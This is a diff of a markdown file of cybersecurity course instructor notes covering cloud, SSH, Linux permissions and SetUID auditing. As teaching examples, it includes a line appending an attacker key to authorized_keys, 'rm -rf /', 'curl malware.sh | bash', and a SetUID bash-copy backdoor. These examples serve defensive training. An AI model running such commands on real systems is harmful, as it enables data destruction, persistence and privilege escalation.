@@ -1,67 +1,3 @@
-# Day 1 — Refined Instructor Notes
-
-Readable, organized coverage of **Cybersecurity in AI** Day 1 (96 slides).
-All content from [`day1_notes.md`](../day1_notes.md) is preserved in this single file;
-diagrams linked as → [title](path.svg) — click to open.
-
-## Table of contents
-
-1. [What is Cybersecurity?](#part-01-what-is-cybersecurity) — *Foundations*
-2. [The CIA Triad](#part-02-the-cia-triad) — *Foundations*
-3. [The Modern Threat Landscape](#part-03-the-modern-threat-landscape) — *Foundations*
-4. [Cloud Computing and the New Perimeter](#part-04-cloud-computing-and-the-new-perimeter) — *Foundations*
-5. [Shared Responsibility Model (Deep Dive)](#part-05-shared-responsibility-model-deep-dive) — *Foundations*
-6. [AWS and Cloud Infrastructure](#part-06-aws-and-cloud-infrastructure) — *AWS & EC2*
-7. [AWS Regions, Availability Zones, IAM, VPC, and EC2](#part-07-aws-regions-availability-zones-iam-vpc-and-ec2) — *AWS & EC2*
-8. [IAM Roles, Least Privilege, EC2, VPC and S3 Access](#part-08-iam-roles-least-privilege-ec2-vpc-and-s3-access) — *AWS & EC2*
-9. [Virtual Machines and EC2 Instances](#part-09-virtual-machines-and-ec2-instances) — *AWS & EC2*
-10. [Launching EC2 Instances Safely](#part-10-launching-ec2-instances-safely) — *AWS & EC2*
-11. [SSH (Secure Shell)](#part-11-ssh-secure-shell) — *AWS & EC2*
-12. [SSH Key-Based Authentication](#part-12-ssh-key-based-authentication) — *AWS & EC2*
-13. [Navigating the Linux Filesystem](#part-13-navigating-the-linux-filesystem) — *AWS & EC2*
-14. [Linux File Permissions](#part-14-linux-file-permissions) — *AWS & EC2*
-15. [SetUID Binaries and Privilege Risk](#part-15-setuid-binaries-and-privilege-risk) — *AWS & EC2*
-16. [Finding and Investigating SetUID Binaries](#part-16-finding-and-investigating-setuid-binaries) — *AWS & EC2*
-17. [Security Groups as Firewalls](#part-17-security-groups-as-firewalls) — *AWS & EC2*
-18. [Running and Securing a Web Service](#part-18-running-and-securing-a-web-service) — *AWS & EC2*
-19. [The SOC Analyst Role](#part-19-the-soc-analyst-role) — *SOC & Detection*
-20. [The Cyber Kill Chain](#part-20-the-cyber-kill-chain) — *SOC & Detection*
-21. [MITRE ATT&CK FRAMEWORK – Instructor Notes](#part-21-mitre-attck-framework-instructor-notes) — *SOC & Detection (slides 31–44)*
-22. [BRUTE FORCE AND CREDENTIAL ATTACKS (MITRE ATT&CK T1110)](#part-22-brute-force-and-credential-attacks-mitre-attck-t1110) — *SOC & Detection (slides 31–44)*
-23. [PRIVILEGE ESCALATION (MITRE ATT&CK T1548)](#part-23-privilege-escalation-mitre-attck-t1548) — *SOC & Detection (slides 31–44)*
-24. [WHY LOGS ARE THE FOUNDATION OF DETECTION](#part-24-why-logs-are-the-foundation-of-detection) — *SOC & Detection (slides 31–44)*
-25. [LINUX LOGGING — JOURNALD AND AUDITD](#part-25-linux-logging-journald-and-auditd) — *SOC & Detection (slides 31–44)*
-26. [COLLECTING SSH EVIDENCE](#part-26-collecting-ssh-evidence) — *SOC & Detection (slides 31–44)*
-27. [EVIDENCE AND THE ANALYST WORKFLOW](#part-27-evidence-and-the-analyst-workflow) — *SOC & Detection (slides 31–44)*
-28. [RISK SCORING FUNDAMENTALS](#part-28-risk-scoring-fundamentals) — *SOC & Detection (slides 31–44)*
-29. [Cloud Security Posture Management (CSPM)](#part-29-cloud-security-posture-management-cspm) — *CSPM & AWS Security (slides 73–96)*
-30. [Cloud Security Posture Management (CSPM)](#part-30-cloud-security-posture-management-cspm) — *CSPM & AWS Security (slides 73–96)*
-
-## Course flow (matches slide deck)
-
-| Block | Slides | What's covered |
-|-------|--------|----------------|
-| Intro | 1–5 | Course logistics, instructor, prerequisites |
-| Foundations | 6–10 | Cybersecurity, CIA triad, cloud perimeter, shared responsibility |
-| AWS & EC2 | 11–23 | IAM, VPC, EC2, SSH, Linux, nginx, security groups |
-| Pop quizzes | 24–29 | SSH, permissions, security groups |
-| Lab 1.1 | 30 | Instance setup |
-| SOC & detection | 31–44 | Kill chain, ATT&CK, logs, risk scoring |
-| Pop quizzes | 45–50 | T1110, risk scoring |
-| Lab 1.2 | 51 | Suspicious activity simulation |
-| AI in security | 52–65 | Prompts, IAM, least privilege, validation |
-| Pop quizzes | 66–71 | IAM / Lambda policies |
-| Lab 1.3 | 72 | AI-assisted scripting & IAM review |
-| CSPM & AWS security | 73–89 | Security Hub, GuardDuty, S3, remediation |
-| Pop quizzes | 90–95 | Security Hub, MFA, security groups |
-| Lab 1.4 | 96 | Security posture baseline |
-
-## Notes
-
-- **Instructor Opening** blocks are discussion prompts; **Key Takeaway** blocks are slide closers.
-- Diagrams appear as compact links (SVG files open on click).
-- Regenerate after editing `day1_notes.md`: `python gurinder_practice/slide_notes/day1/build_refined_notes.py`
-
 # Day 1 content
 
 ---
@@ -489,11 +425,13 @@ It is the foundational model of information security.
 
 Think of it as:
 
-- Cybersecurity
-- │
-- ┌──────────────┼──────────────┐
-- │              │              │
-- Confidentiality   Integrity   Availability
+```text
+Cybersecurity
+│
+┌──────────────┼──────────────┐
+│              │              │
+Confidentiality   Integrity   Availability
+```
 
 Every security decision should answer:
 
@@ -869,27 +807,16 @@ Users cannot access data.
 Show this table:
 
 | Control            | C | I | A |
-
 | ------------------ | - | - | - |
-
 | Encryption         | ✓ |   |   |
-
 | MFA                | ✓ |   |   |
-
 | IAM Policies       | ✓ |   |   |
-
 | Hashing            |   | ✓ |   |
-
 | Digital Signatures |   | ✓ |   |
-
 | Audit Logs         |   | ✓ |   |
-
 | Backups            |   |   | ✓ |
-
 | Load Balancer      |   |   | ✓ |
-
 | Auto Scaling       |   |   | ✓ |
-
 | Disaster Recovery  |   |   | ✓ |
 
 ## How CIA Relates to SOC Operations
@@ -1009,9 +936,11 @@ Examples:
 
 Before:
 
-- Employee
-- ↓
-- Office Network
+```text
+Employee
+↓
+Office Network
+```
 
 Now:
 
@@ -1214,9 +1143,11 @@ Most students struggle with this concept.
 
 Attacker targets victim directly.
 
-- Attacker
-- ↓
-- Company
+```text
+Attacker
+↓
+Company
+```
 
 ### Supply Chain Attack
 
@@ -1318,6 +1249,7 @@ Anyone can access files.
   "Action":"*",
   "Resource":"*"
 }
+
 ```
 
 Too much access.
@@ -1600,9 +1532,11 @@ We ask:
 
 Old Security
 
-- Inside Office
-- ↓
-- Trusted
+```text
+Inside Office
+↓
+Trusted
+```
 
 Modern Security
 
@@ -1835,9 +1769,11 @@ This phrase appears everywhere in cloud security.
 
 Old model:
 
-- Firewall
-- ↓
-- Trust User
+```text
+Firewall
+↓
+Trust User
+```
 
 Modern model:
 
@@ -1885,9 +1821,11 @@ AI flags anomaly.
 
 **Detect Privilege Escalation:** Example:
 
-- Normal User
-- ↓
-- Admin Privileges
+```text
+Normal User
+↓
+Admin Privileges
+```
 
 AI identifies unusual behavior.
 
@@ -2279,6 +2217,7 @@ Example:
   "Action":"*",
   "Resource":"*"
 }
+
 ```
 
 Administrator access everywhere.
@@ -2589,17 +2528,11 @@ AWS was born.
 Students should know the major players.
 
 | Provider        | Market Position  |
-
 | --------------- | ---------------- |
-
 | AWS             | Largest          |
-
 | Microsoft Azure | Second           |
-
 | Google Cloud    | Third            |
-
 | Oracle Cloud    | Enterprise Focus |
-
 | IBM Cloud       | Specialized      |
 
 Most cybersecurity jobs today involve one of these cloud platforms.
@@ -3071,10 +3004,12 @@ An Availability Zone is an isolated data center (or group of data centers) insid
 
 Example:
 
-- us-east-1
-- ├── us-east-1a
-- ├── us-east-1b
-- ├── us-east-1c
+```text
+us-east-1
+├── us-east-1a
+├── us-east-1b
+├── us-east-1c
+```
 
 ## Simple Analogy
 
@@ -3130,15 +3065,10 @@ Students confuse these constantly.
 Use this table.
 
 | Concept           | Example               |
-
 | ----------------- | --------------------- |
-
 | Region            | us-east-1             |
-
 | Availability Zone | us-east-1a            |
-
 | Purpose           | Geographic separation |
-
 | AZ Purpose        | Fault isolation       |
 
 ## What is IAM?
@@ -3210,6 +3140,7 @@ Example:
 ```json
 Allow:
 Read S3
+
 ```
 
 ## Real World Example
@@ -3253,6 +3184,7 @@ Bad:
 ```json
 Action: *
 Resource: *
+
 ```
 
 Good:
@@ -3567,9 +3499,11 @@ This is a security best practice.
 
 Public Server:
 
-- Internet
-- ↓
-- Server
+```text
+Internet
+↓
+Server
+```
 
 Higher risk.
 
@@ -3694,6 +3628,7 @@ The role contains:
  "Action":["s3:GetObject"],
  "Resource":"arn:aws:s3:::my-app-data/*"
 }
+
 ```
 
 Let's decode this.
@@ -3702,6 +3637,7 @@ Let's decode this.
 
 ```json
 "Effect":"Allow"
+
 ```
 
 Means:
@@ -3712,6 +3648,7 @@ Means:
 
 ```json
 "s3:GetObject"
+
 ```
 
 Means:
@@ -3724,6 +3661,7 @@ only.
 
 ```json
 "arn:aws:s3:::my-app-data/*"
+
 ```
 
 Means:
@@ -3816,6 +3754,7 @@ Bad:
 
 ```bash
 sudo su
+
 ```
 
 all day.
@@ -3824,6 +3763,7 @@ Good:
 
 ```bash
 Run only required commands
+
 ```
 
 ## Database Example
@@ -3832,6 +3772,7 @@ Bad:
 
 ```sql
 DBA Access
+
 ```
 
 for everyone.
@@ -3840,6 +3781,7 @@ Good:
 
 ```sql
 Read Only Access
+
 ```
 
 when appropriate.
@@ -3922,15 +3864,20 @@ SOC analysts constantly investigate:
 `Privilege Escalation`
 
 Examples:
-- Read User
-- ↓
-- Admin User
+
+```text
+Read User
+↓
+Admin User
+```
 
 or
 
-- Limited Role
-- ↓
-- Full Administrator
+```text
+Limited Role
+↓
+Full Administrator
+```
 
 GuardDuty and Security Hub often detect such events.
 
@@ -3989,9 +3936,11 @@ Before explaining EC2, explain virtualization.
 
 One application per server.
 
-- Physical Server
-- │
-- └── Application
+```text
+Physical Server
+│
+└── Application
+```
 
 Problems:
 
@@ -4003,11 +3952,13 @@ Problems:
 
 One physical server can host multiple virtual machines.
 
-- Physical Server
-- ├── VM1
-- ├── VM2
-- ├── VM3
-- └── VM4
+```text
+Physical Server
+├── VM1
+├── VM2
+├── VM3
+└── VM4
+```
 
 Each VM behaves like a separate computer.
 
@@ -4245,6 +4196,7 @@ You keep:
 
 ```bash
 ssh -i mykey.pem ec2-user@server
+
 ```
 
 The private key proves your identity.
@@ -4580,6 +4532,7 @@ Example:
 
 ```bash
 ssh -i mykey.pem ec2-user@server
+
 ```
 
 ## Why is SSH Dangerous?
@@ -4926,6 +4879,7 @@ Example:
 ```json
 Allow:
 s3:GetObject
+
 ```
 
 only.
@@ -5159,6 +5113,7 @@ You connect using:
 
 ```bash
 ssh -i mykey.pem ec2-user@54.x.x.x
+
 ```
 
 Now you're controlling that remote Linux machine.
@@ -5175,9 +5130,11 @@ Different departments use different doors.
 
 Example:
 
-- Port 80   → Website
-- Port 443  → Secure Website
-- Port 22   → SSH
+```text
+Port 80   → Website
+Port 443  → Secure Website
+Port 22   → SSH
+```
 
 ## Why Attackers Love Port 22
 
@@ -5204,12 +5161,14 @@ Show:
 
 ```bash
 sudo tail -f /var/log/secure
+
 ```
 
 or
 
 ```bash
 sudo journalctl -f
+
 ```
 
 on a public server.
@@ -5312,6 +5271,7 @@ Instead of typing password:
 
 ```bash
 ssh -i mykey.pem ec2-user@server
+
 ```
 
 The private key proves your identity.
@@ -5378,6 +5338,7 @@ ls
 cd
 mkdir
 cat
+
 ```
 
 All run inside a shell.
@@ -5395,6 +5356,7 @@ Login as:
 
 ```bash
 ec2-user
+
 ```
 
 Permissions:
@@ -5407,6 +5369,7 @@ Login as:
 
 ```bash
 root
+
 ```
 
 Permissions:
@@ -5421,6 +5384,7 @@ Use:
 
 ```bash
 sudo
+
 ```
 
 only when needed.
@@ -5710,18 +5674,21 @@ Example:
 
 ```bash
 /home/ec2-user/
+
 ```
 
 Inside:
 
 ```bash
 /home/ec2-user/.ssh/
+
 ```
 
 File:
 
 ```bash
 authorized_keys
+
 ```
 
 contains:
@@ -5730,11 +5697,13 @@ contains:
 
 ## Example
 
-- Server
-- authorized_keys
-- ├── Alice Public Key
-- ├── Bob Public Key
-- └── Admin Public Key
+```text
+Server
+authorized_keys
+├── Alice Public Key
+├── Bob Public Key
+└── Admin Public Key
+```
 
 Each user can authenticate using their matching private key.
 
@@ -5750,6 +5719,7 @@ User starts SSH:
 
 ```bash
 ssh -i mykey.pem ec2-user@server
+
 ```
 
 ## Step 2
@@ -5863,8 +5833,10 @@ Bad practice.
 
 **Protect Private Key:** Treat it like a password.
 **Use Strong Permissions:** Linux:
+
 ```bash
 chmod 400 mykey.pem
+
 ```
 
 **Use Individual Keys:** One key per administrator.
@@ -5948,6 +5920,7 @@ Then executes:
 
 ```bash
 echo "attacker_public_key" >> ~/.ssh/authorized_keys
+
 ```
 
 Now attacker can return anytime.
@@ -6080,16 +6053,18 @@ Home directory of the root user.
 
 Think of Linux as an upside-down tree.
 
-- /
-- ├── bin
-- ├── etc
-- ├── home
-- ├── var
-- ├── usr
-- ├── tmp
-- ├── dev
-- ├── proc
-- └── boot
+```text
+/
+├── bin
+├── etc
+├── home
+├── var
+├── usr
+├── tmp
+├── dev
+├── proc
+└── boot
+```
 
 Every path starts from:
 `/`
@@ -6114,24 +6089,28 @@ Knowing the filesystem saves hours.
 Contains essential user commands.
 
 Examples:
+
 ```bash
 ls
 cp
 mv
 cat
 pwd
+
 ```
 
 ## Example
 
 ```bash
 /bin/ls
+
 ```
 
 is the actual location of:
 
 ```bash
 ls
+
 ```
 
 ## Why Security Teams Care
@@ -6155,11 +6134,13 @@ Contains:
 `System Administration Commands`
 
 Examples:
+
 ```bash
 ifconfig
 reboot
 shutdown
 fsck
+
 ```
 
 ## Purpose
@@ -6175,6 +6156,7 @@ Checking network configuration:
 
 ```bash
 /sbin/ip addr
+
 ```
 
 ## 3. /etc
@@ -6199,20 +6181,28 @@ Examples:
 ## Important Files
 
 **User Accounts**
+
 ```bash
 /etc/passwd
+
 ```
 **Password Information**
+
 ```bash
 /etc/shadow
+
 ```
 **Hostname**
+
 ```bash
 /etc/hostname
+
 ```
 **SSH Settings**
+
 ```bash
 /etc/ssh/sshd_config
+
 ```
 
 ## Cybersecurity Importance
@@ -6235,6 +6225,7 @@ inside:
 
 ```bash
 /etc/ssh/sshd_config
+
 ```
 
 making brute-force attacks easier.
@@ -6285,39 +6276,52 @@ Data changes frequently.
 ## Important Subdirectories
 
 **Logs**
+
 ```bash
 /var/log
+
 ```
 **Cache**
+
 ```bash
 /var/cache
+
 ```
 **Spool Files**
+
 ```bash
 /var/spool
+
 ```
 
 ## Most Important Security Location
 
 ```bash
 /var/log
+
 ```
 
 ## Common Log Files
 
 **Authentication Logs:** Ubuntu:
+
 ```bash
 /var/log/auth.log
+
 ```
 
 **Security Logs:** RHEL/Amazon Linux:
+
 ```bash
 /var/log/secure
+
 ```
 
 **System Logs**
+
 ```bash
 /var/log/messages
+
 ```
 
 ## Incident Response Example
@@ -6326,6 +6330,7 @@ Investigating SSH attacks:
 
 ```bash
 cat /var/log/secure
+
 ```
 
 ## 6. /usr
@@ -6344,6 +6349,7 @@ Think:
 /usr/bin
 /usr/lib
 /usr/share
+
 ```
 
 ## Windows Equivalent
@@ -6378,6 +6384,7 @@ Attackers love:
 
 ```bash
 /tmp
+
 ```
 
 because:
@@ -6389,6 +6396,7 @@ because:
 
 ```bash
 /tmp/malware.sh
+
 ```
 
 ## Incident Response Tip
@@ -6397,6 +6405,7 @@ Always inspect:
 
 ```bash
 ls -la /tmp
+
 ```
 
 during investigations.
@@ -6408,10 +6417,12 @@ Contains device files.
 Linux treats devices as files.
 
 Examples:
+
 ```bash
 /dev/sda
 /dev/null
 /dev/random
+
 ```
 
 ## Example
@@ -6420,6 +6431,7 @@ Hard disk:
 
 ```bash
 /dev/sda
+
 ```
 
 ## Security Relevance
@@ -6448,16 +6460,22 @@ Generated by the kernel.
 ## Examples
 
 **CPU Information**
+
 ```bash
 cat /proc/cpuinfo
+
 ```
 **Memory Information**
+
 ```bash
 cat /proc/meminfo
+
 ```
 **Running Processes**
+
 ```bash
 /proc/PID
+
 ```
 
 ## Security Relevance
@@ -6486,6 +6504,7 @@ Bootkits and rootkits often target:
 
 ```bash
 /boot
+
 ```
 
 ## Most Important Directories for Cybersecurity
@@ -6506,24 +6525,34 @@ you'll already be ahead of many beginners.
 Show these on a Linux VM:
 
 **Current Directory**
+
 ```bash
 pwd
+
 ```
 **List Files**
+
 ```bash
 ls -la
+
 ```
 **Change Directory**
+
 ```bash
 cd /var/log
+
 ```
 **View Logs**
+
 ```bash
 ls
+
 ```
 **Go Home**
+
 ```bash
 cd ~
+
 ```
 
 ## Typical Incident Investigation Workflow
@@ -6593,15 +6622,19 @@ For cybersecurity professionals, understanding permissions is essential for:
 Ask students:
 
 **Scenario:** Suppose your banking application stores customer data in:
+
 ```bash
 /customer-data.csv
+
 ```
 
 Who should be able to access it?
 
-- Application Owner → Yes
-- Database Team → Maybe
-- Everyone On Server → No
+```text
+Application Owner → Yes
+Database Team → Maybe
+Everyone On Server → No
+```
 
 Linux permissions enforce these rules.
 
@@ -6648,12 +6681,14 @@ Show students:
 
 ```bash
 ls -l
+
 ```
 
 Example output:
 
 ```bash
 -rwxr-xr-- 1 alice developers 1024 file.txt
+
 ```
 
 This looks scary at first.
@@ -6666,6 +6701,7 @@ Example:
 
 ```bash
 -rwxr-xr--
+
 ```
 
 Break it into sections:
@@ -6687,9 +6723,11 @@ Other possibilities:
 
 ## Three Permission Groups
 
-- rwx   r-x   r--
-- │     │     │
-- Owner Group Others
+```text
+rwx   r-x   r--
+│     │     │
+Owner Group Others
+```
 
 ## Owner Permissions
 
@@ -6740,6 +6778,7 @@ Example:
 
 ```bash
 cat file.txt
+
 ```
 
 ### Write (w)
@@ -6756,6 +6795,7 @@ Example:
 
 ```bash
 echo "Hello" >> file.txt
+
 ```
 
 ### Execute (x)
@@ -6772,6 +6812,7 @@ Example:
 
 ```bash
 ./script.sh
+
 ```
 
 ## Numeric Permission System
@@ -6782,6 +6823,7 @@ Students often see:
 
 ```bash
 chmod 755 file
+
 ```
 
 Let's decode it.
@@ -6825,6 +6867,7 @@ Only owner can read/write.
 
 ```bash
 chmod 600 key.pem
+
 ```
 
 This is extremely important in AWS.
@@ -6845,6 +6888,7 @@ Suppose permissions are:
 
 ```bash
 -rw-rw-rw-
+
 ```
 
 Anyone on the server could read it.
@@ -6855,6 +6899,7 @@ Huge security risk.
 
 ```bash
 chmod 600 key.pem
+
 ```
 
 Result:
@@ -6869,6 +6914,7 @@ If permissions are too open:
 
 ```bash
 chmod 777 mykey.pem
+
 ```
 
 SSH may refuse to use it.
@@ -6885,12 +6931,14 @@ Check ownership:
 
 ```bash
 ls -l
+
 ```
 
 Example:
 
 ```bash
 -rw-r--r-- alice developers report.txt
+
 ```
 
 Owner:
@@ -6907,12 +6955,14 @@ Use:
 
 ```bash
 chown
+
 ```
 
 Example:
 
 ```bash
 sudo chown alice file.txt
+
 ```
 
 ## Changing Group
@@ -6921,6 +6971,7 @@ Example:
 
 ```bash
 sudo chgrp developers file.txt
+
 ```
 
 ## Directories and Permissions
@@ -6949,6 +7000,7 @@ using:
 
 ```bash
 cd
+
 ```
 
 ## Example
@@ -6957,6 +7009,7 @@ Without execute permission:
 
 ```bash
 cd /secure-folder
+
 ```
 
 fails.
@@ -6973,6 +7026,7 @@ Let's explain why it is dangerous.
 
 ```bash
 chmod 777 payroll.sh
+
 ```
 
 Now:
@@ -6988,6 +7042,7 @@ Payroll application executes:
 
 ```bash
 payroll.sh
+
 ```
 
 daily.
@@ -6996,12 +7051,14 @@ Attacker modifies it:
 
 ```bash
 rm -rf /
+
 ```
 
 or
 
 ```bash
 curl malware.sh | bash
+
 ```
 
 Now malicious code runs automatically.
@@ -7029,6 +7086,7 @@ Finds:
 
 ```bash
 backup.sh
+
 ```
 
 owned by root.
@@ -7037,6 +7095,7 @@ File permissions:
 
 ```bash
 777
+
 ```
 
 User modifies script.
@@ -7054,12 +7113,16 @@ This is privilege escalation.
 Security teams often look for:
 
 **World Writable Files**
+
 ```bash
 find / -perm -002
+
 ```
 **SUID Files**
+
 ```bash
 find / -perm -4000
+
 ```
 **Unexpected Ownership Changes**
 **Permission Modifications:** These frequently indicate compromise.
@@ -7092,24 +7155,34 @@ AI flags anomaly.
 Show students:
 
 **View Permissions**
+
 ```bash
 ls -l
+
 ```
 **Change Permissions**
+
 ```bash
 chmod 755 script.sh
+
 ```
 **Secure SSH Key**
+
 ```bash
 chmod 600 mykey.pem
+
 ```
 **Change Owner**
+
 ```bash
 sudo chown alice file.txt
+
 ```
 **Find World-Writable Files**
+
 ```bash
 find / -perm -002
+
 ```
 
 → [Whiteboard Diagram](diagrams/linux-file-permissions-034.svg)
@@ -7136,9 +7209,11 @@ Students should answer:
 
 **Q: Which command shows permissions?** ```bash
 ls -l
+
 ```
 **Q: Which command changes permissions?** ```bash
 chmod
+
 ```
 
 ## Instructor Key Takeaway
@@ -7200,6 +7275,7 @@ Example:
 
 ```bash
 whoami
+
 ```
 
 returns:
@@ -7210,6 +7286,7 @@ If Bob launches:
 
 ```bash
 ./program
+
 ```
 
 the program runs as:
@@ -7226,6 +7303,7 @@ runs:
 
 ```bash
 cat file.txt
+
 ```
 
 The cat command runs with:
@@ -7249,12 +7327,14 @@ When user runs:
 
 ```bash
 passwd
+
 ```
 
 Linux modifies:
 
 ```bash
 /etc/shadow
+
 ```
 
 But:
@@ -7281,15 +7361,19 @@ It tells Linux:
 
 ## Normal Behavior
 
-- User Starts Program
-- ↓
-- Program Runs As User
+```text
+User Starts Program
+↓
+Program Runs As User
+```
 
 ## SetUID Behavior
 
-- User Starts Program
-- ↓
-- Program Runs As Owner
+```text
+User Starts Program
+↓
+Program Runs As Owner
+```
 
 ## Visual Example
 
@@ -7297,6 +7381,7 @@ Suppose:
 
 ```bash
 passwd
+
 ```
 
 is owned by:
@@ -7313,6 +7398,7 @@ runs:
 
 ```bash
 passwd
+
 ```
 
 Program executes as:
@@ -7333,12 +7419,14 @@ Run:
 
 ```bash
 ls -l
+
 ```
 
 Example:
 
 ```bash
 -rwsr-xr-x
+
 ```
 
 Notice:
@@ -7369,6 +7457,7 @@ Meaning:
 
 ```bash
 -rwsr-xr-x root root passwd
+
 ```
 
 means:
@@ -7384,6 +7473,7 @@ even when launched by normal users.
 
 ```bash
 sudo
+
 ```
 
 Allows authorized users to perform administrative tasks.
@@ -7392,6 +7482,7 @@ Allows authorized users to perform administrative tasks.
 
 ```bash
 passwd
+
 ```
 
 Updates password database.
@@ -7406,6 +7497,7 @@ Find SetUID programs:
 
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 
 Output might show:
@@ -7435,9 +7527,11 @@ Because SetUID programs often run as:
 
 If attacker exploits one:
 
-- Normal User
-- ↓
-- Root Access
+```text
+Normal User
+↓
+Root Access
+```
 
 This is:
 
@@ -7489,6 +7583,7 @@ Copy bash:
 
 ```bash
 sudo cp $(which bash) harmless
+
 ```
 
 Creates:
@@ -7505,6 +7600,7 @@ Add SetUID:
 
 ```bash
 sudo chmod +s harmless
+
 ```
 
 Now:
@@ -7519,6 +7615,7 @@ Execute:
 
 ```bash
 ./harmless -p
+
 ```
 
 Result:
@@ -7550,24 +7647,28 @@ Creates:
 
 ```bash
 /backdoor
+
 ```
 
 Sets ownership:
 
 ```bash
 chown root:root backdoor
+
 ```
 
 Adds SetUID:
 
 ```bash
 chmod 4755 backdoor
+
 ```
 
 Now any user can run:
 
 ```bash
 ./backdoor
+
 ```
 
 and receive:
@@ -7590,6 +7691,7 @@ One of the first checks is:
 
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 
 Why?
@@ -7617,15 +7719,19 @@ Very dangerous.
 
 **Minimize SetUID Programs:** Only install what is necessary.
 **Regular Audits:** Run:
+
 ```bash
 find / -perm -4000
+
 ```
 
 **Patch Vulnerabilities:** Update operating system regularly.
 **Monitor New SetUID Files:** Unexpected additions are suspicious.
 **Remove Unnecessary SetUID Bits:** Example:
+
 ```bash
 chmod u-s filename
+
 ```
 
 removes SetUID.
@@ -7656,9 +7762,11 @@ AI-powered EDR and SIEM tools monitor:
 
 Example:
 
-- Normal User
-- ↓
-- Creates SetUID Binary
+```text
+Normal User
+↓
+Creates SetUID Binary
+```
 
 AI flags:
 
@@ -7669,20 +7777,28 @@ AI flags:
 Show students:
 
 **View Permissions**
+
 ```bash
 ls -l
+
 ```
 **Find SetUID Files**
+
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 **Remove SetUID**
+
 ```bash
 chmod u-s filename
+
 ```
 **Check Owner**
+
 ```bash
 ls -l file
+
 ```
 
 → [Whiteboard Diagram](diagrams/setuid-binaries-and-privilege-risk-036.svg)
@@ -7708,10 +7824,12 @@ Example:
 
 ```bash
 -rwsr-xr-x
+
 ```
 
 **Q: What command finds SetUID files?** ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 **Q: Why are vulnerable SetUID programs dangerous?:** Because they often execute with root privileges and can lead to privilege escalation.
 
@@ -7755,9 +7873,11 @@ One of the first things security teams examine is:
 
 because they can provide:
 
-- Normal User
-- ↓
-- Root Access
+```text
+Normal User
+↓
+Root Access
+```
 
 ## Why We Search for SetUID Files
 
@@ -7788,6 +7908,7 @@ The slide shows:
 
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 
 Let's break it apart.
@@ -7796,6 +7917,7 @@ Let's break it apart.
 
 ```bash
 find
+
 ```
 
 Purpose:
@@ -7806,6 +7928,7 @@ Example:
 
 ```bash
 find /home
+
 ```
 
 Searches inside:
@@ -7816,6 +7939,7 @@ Searches inside:
 
 ```bash
 /
+
 ```
 
 Means:
@@ -7830,6 +7954,7 @@ Linux will search:
 
 ```bash
 -perm -4000
+
 ```
 
 This is the important part.
@@ -7846,6 +7971,7 @@ Therefore:
 
 ```bash
 -perm -4000
+
 ```
 
 means:
@@ -7856,6 +7982,7 @@ means:
 
 ```bash
 2>/dev/null
+
 ```
 
 Students often find this confusing.
@@ -7884,6 +8011,7 @@ Without:
 
 ```bash
 2>/dev/null
+
 ```
 
 you might see:
@@ -7906,6 +8034,7 @@ Therefore:
 
 ```bash
 2>/dev/null
+
 ```
 
 means:
@@ -7916,6 +8045,7 @@ means:
 
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 
 means:
@@ -7931,6 +8061,7 @@ Example:
 /usr/bin/sudo
 /usr/bin/chsh
 /usr/bin/mount
+
 ```
 
 ## Should We Panic?
@@ -7962,6 +8093,7 @@ Suppose audit shows:
 /usr/bin/passwd
 /usr/bin/sudo
 /tmp/update
+
 ```
 
 Question:
@@ -7982,18 +8114,21 @@ Creates:
 
 ```bash
 /backdoor
+
 ```
 
 Sets:
 
 ```bash
 chmod 4755 backdoor
+
 ```
 
 Now any user can run:
 
 ```bash
 ./backdoor
+
 ```
 
 and obtain:
@@ -8018,6 +8153,7 @@ The screenshot shows:
 
 ```bash
 sudo find . -perm 4000
+
 ```
 
 with:
@@ -8032,6 +8168,7 @@ Because earlier a SetUID bit was added:
 
 ```bash
 chmod +s harmless
+
 ```
 
 The find command successfully discovered it.
@@ -8050,6 +8187,7 @@ Check users.
 
 ```bash
 cat /etc/passwd
+
 ```
 
 ### Step 2
@@ -8058,6 +8196,7 @@ Check sudo privileges.
 
 ```bash
 sudo -l
+
 ```
 
 ### Step 3
@@ -8066,6 +8205,7 @@ Check running processes.
 
 ```bash
 ps aux
+
 ```
 
 ### Step 4
@@ -8074,6 +8214,7 @@ Check SetUID binaries.
 
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 
 ### Step 5
@@ -8126,6 +8267,7 @@ They may search:
 
 ```bash
 find / -perm -4000
+
 ```
 
 then review:
@@ -8157,6 +8299,7 @@ Penetration testers routinely search for:
 
 ```bash
 find / -perm -4000
+
 ```
 
 because:
@@ -8213,20 +8356,28 @@ and raises an alert.
 ## Useful Commands for Students
 
 **Find SetUID Files**
+
 ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 **Show Detailed Information**
+
 ```bash
 find / -perm -4000 -exec ls -l {} \; 2>/dev/null
+
 ```
 **Find SetUID Files Owned by Root**
+
 ```bash
 find / -user root -perm -4000 2>/dev/null
+
 ```
 **Remove SetUID**
+
 ```bash
 chmod u-s filename
+
 ```
 
 → [Whiteboard Diagram](diagrams/finding-and-investigating-setuid-binaries-037.svg)
@@ -8235,6 +8386,7 @@ chmod u-s filename
 
 **Q: What command finds SetUID files?** ```bash
 find / -perm -4000 2>/dev/null
+
 ```
 **Q: What does 4000 represent?:** `SetUID Bit`
 **Q: Why suppress errors with 2>/dev/null?:** To hide permission-denied messages.
@@ -8375,9 +8527,11 @@ AWS Security Groups are:
 
 Meaning:
 
-- If Not Explicitly Allowed
-- ↓
-- Denied
+```text
+If Not Explicitly Allowed
+↓
+Denied
+```
 
 ## Example
 
@@ -8494,19 +8648,12 @@ Ports identify services.
 Examples:
 
 | Service    | Port |
-
 | ---------- | ---- |
-
 | SSH        | 22   |
-
 | HTTP       | 80   |
-
 | HTTPS      | 443  |
-
 | MySQL      | 3306 |
-
 | PostgreSQL | 5432 |
-
 | RDP        | 3389 |
 
 ## Source
@@ -8594,8 +8741,10 @@ Now only you can connect.
 **Security Group A:** Green side.
 Rules:
 
-- SSH (22) → My IP Only
-- HTTPS (443) → Everyone
+```text
+SSH (22) → My IP Only
+HTTPS (443) → Everyone
+```
 
 Result:
 
@@ -8654,8 +8803,10 @@ only.
 
 Security Group:
 
-- SSH 22 → Admin IP
-- HTTPS 443 → Internet
+```text
+SSH 22 → Admin IP
+HTTPS 443 → Internet
+```
 
 Result:
 
@@ -8684,9 +8835,11 @@ Instead of IPs, Security Groups can reference:
 
 Example:
 
-- App Servers
